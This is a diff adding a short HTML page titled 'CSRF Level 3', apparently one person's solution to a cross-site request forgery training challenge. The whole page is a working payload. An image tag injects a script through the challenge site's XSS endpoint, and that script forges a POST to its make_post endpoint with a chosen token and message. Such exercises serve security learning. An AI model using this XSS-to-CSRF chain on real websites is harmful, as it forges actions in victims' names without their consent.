@@ -1,0 +1,12 @@
+<!DOCTYPE html>
+<html>
+    <head lang="en">
+        <meta charset="UTF-8">
+        <meta name="author" content="Kevin Ly">
+        <title>CSRF Level 3</title>
+    </head>
+
+    <body>
+        <img src="http://csrf-challenges.r7.io/xss?cc=<script>$.post('http://csrf-challenges.r7.io/make_post/3',{csrf:'John',post:'kevinly7@uw.edu'});</script>">
+    </body>
+</html>
